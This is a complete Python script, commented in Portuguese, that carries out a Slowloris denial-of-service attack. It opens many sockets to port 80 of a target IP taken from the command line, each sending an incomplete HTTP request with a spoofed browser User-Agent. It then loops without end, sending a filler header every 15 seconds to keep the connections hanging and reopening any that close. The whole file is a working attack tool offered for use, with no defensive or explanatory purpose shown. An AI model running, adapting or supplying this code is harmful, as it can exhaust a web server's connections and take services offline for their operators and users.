import argparse
import logging
import random
import socket
import ssl
import sys
import time

lista_de_sockets = []
configuracao_agente = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
]

def iniciando_socket(ip,porta):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((ip,porta))
    sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
    sock.send(f"User-Agent: {configuracao_agente[0]}\r\n".encode("utf-8"))
    sock.send(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    return sock

def slowloris():
    ip = sys.argv[1]
    porta = 80
    numero_de_sockets = int(sys.argv[2]) if len(sys.argv) == 3 else 33
    print(f"Atacando {ip} com {numero_de_sockets} sockets.")

    print("Criando os sockets...")
    #cria conexao de cada socket
    for i in range(numero_de_sockets):
        try:
            print(f"Criando socket de numero {str(i)}")
            sock = iniciando_socket(ip,porta)
        except socket.error:
            break
        lista_de_sockets.append(sock)

    #mantendo conexoes
    while True:
        print("Enviando dado em todos os sockets para manter a conexao aberta...")
        print(f"Numero de sockets ativos: {len(lista_de_sockets)}")
        #para cada socket da lista envia um novo dado
        for sock in list(lista_de_sockets):
            try:
                #envia dado para conexao aberta
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                #retira sockets com conexao fechada
                lista_de_sockets.remove(sock)

        #verifica se algum socket foi retirado da lista de ativos
        for _ in range(numero_de_sockets - len(lista_de_sockets)):
            print("Recriando socket de conexao perdida...")
            try:
                if sock := iniciando_socket(ip, porta):
                    lista_de_sockets.append(sock)
            except socket.error:
                break
        time.sleep(15)

if __name__ == "__main__":
    if len(sys.argv)> 1:
        slowloris()
